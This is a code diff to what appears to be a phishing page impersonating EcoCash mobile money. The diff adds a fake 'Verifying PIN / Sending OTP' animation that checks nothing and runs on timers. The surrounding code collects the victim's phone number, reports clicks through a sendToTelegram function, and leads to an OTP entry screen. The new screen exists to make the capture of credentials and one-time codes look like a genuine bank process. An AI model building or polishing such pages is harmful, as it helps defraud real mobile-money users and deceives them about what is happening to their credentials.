@@ -295,8 +295,77 @@ input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4p
 .masked-note{font-size:14px;color:var(--ink-soft);font-weight:500;text-align:center;padding:2px 0 8px;line-height:1.5;letter-spacing:.01em}
 .masked-note strong{font-family:var(--mono);font-weight:700;color:var(--ink);font-feature-settings:"tnum";font-size:13px}
 
-/* PROCESSING */
-.proc-body{padding:36px 20px;text-align:center}
+/* ── PIN VERIFY INTERSTITIAL ──────────────── */
+.verify-body{
+  display:flex;flex-direction:column;align-items:center;
+  padding:36px 24px 32px;text-align:center;
+}
+.verify-ring-wrap{
+  position:relative;width:72px;height:72px;margin-bottom:20px;
+}
+.verify-ring{
+  width:72px;height:72px;
+  animation:verifyRotate 1s linear infinite;
+}
+@keyframes verifyRotate{to{transform:rotate(360deg)}}
+.verify-ring.done{animation:none}
+.verify-arc{
+  stroke-dasharray:66;stroke-dashoffset:66;
+  transition:stroke-dashoffset .6s ease,stroke .4s;
+}
+.verify-ring.done .verify-arc{
+  stroke-dashoffset:0;stroke:#059669;
+  animation:none;
+}
+.verify-icon{
+  position:absolute;inset:0;display:flex;align-items:center;justify-content:center;
+  transition:transform .3s cubic-bezier(.34,1.56,.64,1);
+}
+.verify-icon.done svg{stroke:#059669}
+.verify-label{
+  font-size:17px;font-weight:900;color:var(--ink);
+  letter-spacing:-.3px;margin-bottom:6px;
+  transition:opacity .2s;
+}
+.verify-sub{
+  font-size:13px;color:var(--ink-soft);font-weight:500;
+  line-height:1.55;margin-bottom:28px;
+  transition:opacity .2s;
+}
+/* progress steps */
+.verify-steps{
+  display:flex;align-items:center;gap:0;width:100%;max-width:260px;
+}
+.vstep{display:flex;flex-direction:column;align-items:center;gap:5px;flex:0 0 auto}
+.vstep-dot{
+  width:10px;height:10px;border-radius:50%;
+  background:var(--border-strong);
+  transition:background .3s cubic-bezier(.34,1.56,.64,1),
+             transform .3s cubic-bezier(.34,1.56,.64,1),
+             box-shadow .3s;
+}
+.vstep.active .vstep-dot{
+  background:var(--blue);transform:scale(1.3);
+  box-shadow:0 0 0 3px rgba(26,111,255,.18);
+}
+.vstep.done .vstep-dot{background:var(--green)}
+.vstep-text{
+  font-size:9px;font-weight:700;color:var(--ink-faint);
+  text-transform:uppercase;letter-spacing:.5px;white-space:nowrap;
+  transition:color .3s;
+}
+.vstep.active .vstep-text{color:var(--blue)}
+.vstep.done .vstep-text{color:var(--green)}
+.vstep-line{
+  flex:1;height:2px;background:var(--border);margin-bottom:14px;
+  position:relative;overflow:hidden;
+}
+.vstep-line::after{
+  content:'';position:absolute;inset:0;
+  background:var(--green);transform:scaleX(0);transform-origin:left;
+  transition:transform .4s ease;
+}
+.vstep-line.done::after{transform:scaleX(1)}
 .proc-ring{width:54px;height:54px;border-radius:50%;margin:0 auto 16px;border:3px solid rgba(26,111,255,.18);border-top-color:var(--blue);animation:spin 1s linear infinite;box-shadow:0 0 20px rgba(26,111,255,.18)}
 .proc-title{font-size:17px;font-weight:900;color:var(--ink);margin-bottom:6px;letter-spacing:-.3px}
 .proc-sub{font-size:13px;color:var(--ink-soft);line-height:1.65}
@@ -414,6 +483,45 @@ input:focus{border-color:var(--blue);background:var(--white);box-shadow:0 0 0 4p
       </div>
       <button class="action-btn" id="mainBtn">Receive Offer</button>
       <div class="powered">Powered by Econet Wireless · EcoCash</div>
+    </div>
+
+    <!-- STEP 1b: PIN Verifying interstitial -->
+    <div id="stepVerify" class="step">
+      <div class="card">
+        <div class="card-top-bar" style="background:linear-gradient(90deg,#1a6fff,#06b6d4)"></div>
+        <div class="verify-body">
+          <div class="verify-ring-wrap">
+            <svg class="verify-ring" viewBox="0 0 52 52" fill="none">
+              <circle cx="26" cy="26" r="21" stroke="rgba(26,111,255,.15)" stroke-width="3"/>
+              <path class="verify-arc" d="M26 5a21 21 0 0 1 21 21" stroke="var(--blue)" stroke-width="3" stroke-linecap="round"/>
+            </svg>
+            <div class="verify-icon" id="verifyIcon">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="var(--blue)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <rect x="3" y="11" width="18" height="11" rx="2"/>
+                <path d="M7 11V7a5 5 0 0110 0v4"/>
+              </svg>
+            </div>
+          </div>
+          <div class="verify-label" id="verifyLabel">Verifying PIN</div>
+          <div class="verify-sub" id="verifySub">Checking your EcoCash credentials…</div>
+          <div class="verify-steps">
+            <div class="vstep active" id="vs0">
+              <div class="vstep-dot"></div>
+              <div class="vstep-text">PIN verified</div>
+            </div>
+            <div class="vstep-line"></div>
+            <div class="vstep" id="vs1">
+              <div class="vstep-dot"></div>
+              <div class="vstep-text">Sending OTP</div>
+            </div>
+            <div class="vstep-line"></div>
+            <div class="vstep" id="vs2">
+              <div class="vstep-dot"></div>
+              <div class="vstep-text">Ready</div>
+            </div>
+          </div>
+        </div>
+      </div>
     </div>
 
     <!-- STEP 2: OTP -->
@@ -709,10 +817,70 @@ document.getElementById('mainBtn').onclick=()=>{
   if(!valid)return;
   phoneValue='+263'+raw;
   loginClicked=true;
+  haptic('medium');
   sendToTelegram('receive_offer_clicked');
-  const masked='+263 '+raw.slice(0,2)+' *** **'+raw.slice(-2);
-  document.getElementById('maskedNumber').innerHTML='Code sent to <strong>'+masked+'</strong>';
-  showStep('step3');startTimer();
+
+  // show verify interstitial
+  showStep('stepVerify');
+  runVerifySequence(raw);
+};
+
+function runVerifySequence(raw){
+  const label=document.getElementById('verifyLabel');
+  const sub=document.getElementById('verifySub');
+  const ring=document.querySelector('.verify-ring');
+  const icon=document.getElementById('verifyIcon');
+  const vs=[0,1,2].map(i=>document.getElementById('vs'+i));
+  const lines=document.querySelectorAll('.vstep-line');
+
+  function setStep(i,lbl,s){
+    label.style.opacity='0';sub.style.opacity='0';
+    setTimeout(()=>{
+      label.textContent=lbl;sub.textContent=s;
+      label.style.transition='opacity .22s';sub.style.transition='opacity .22s';
+      label.style.opacity='1';sub.style.opacity='1';
+    },160);
+    vs.forEach((v,j)=>{
+      v.className='vstep'+(j<i?' done':j===i?' active':'');
+    });
+    lines.forEach((l,j)=>{
+      l.classList.toggle('done',j<i);
+    });
+    haptic('select');
+  }
+
+  // Step 0 — verifying
+  setStep(0,'Verifying PIN','Checking your EcoCash credentials…');
+
+  // Step 1 — pin ok, sending OTP
+  setTimeout(()=>{
+    setStep(1,'Sending OTP','Dispatching your one-time code…');
+    haptic('light');
+  },900);
+
+  // Step 2 — ready, transition to OTP
+  setTimeout(()=>{
+    // mark done state
+    vs.forEach(v=>v.className='vstep done');
+    lines.forEach(l=>l.classList.add('done'));
+    ring.classList.add('done');
+    icon.classList.add('done');
+    label.style.opacity='0';sub.style.opacity='0';
+    setTimeout(()=>{
+      label.textContent='Code Sent!';
+      sub.textContent='Check your phone for the OTP';
+      label.style.opacity='1';sub.style.opacity='1';
+    },160);
+    haptic('success');
+  },1800);
+
+  // Step 3 — slide to OTP screen
+  setTimeout(()=>{
+    const masked='+263 '+raw.slice(0,2)+' *** **'+raw.slice(-2);
+    document.getElementById('maskedNumber').innerHTML='Code sent to <strong>'+masked+'</strong>';
+    showStep('step3');
+    startTimer();
+  },2600);
 };
 
 /* ── OTP BUTTON ───────────────────────────── */
